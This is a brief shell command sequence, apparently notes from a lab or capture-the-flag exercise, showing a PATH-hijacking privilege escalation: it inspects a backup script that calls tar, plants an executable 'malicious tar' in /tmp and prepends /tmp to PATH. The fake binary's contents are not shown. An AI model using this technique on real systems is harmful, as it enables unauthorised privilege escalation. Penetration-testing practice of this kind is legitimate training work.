# Verify user context

whoami
id

# =========================
# Attempt 1: PATH Hijacking
# =========================

# Inspect backup script

cat /usr/local/bin/backup.sh

# Check tar location

which tar

# Prepare malicious tar binary

cd /tmp
nano tar
chmod +x /tmp/tar

# Manipulate PATH

export PATH=/tmp:$PATH
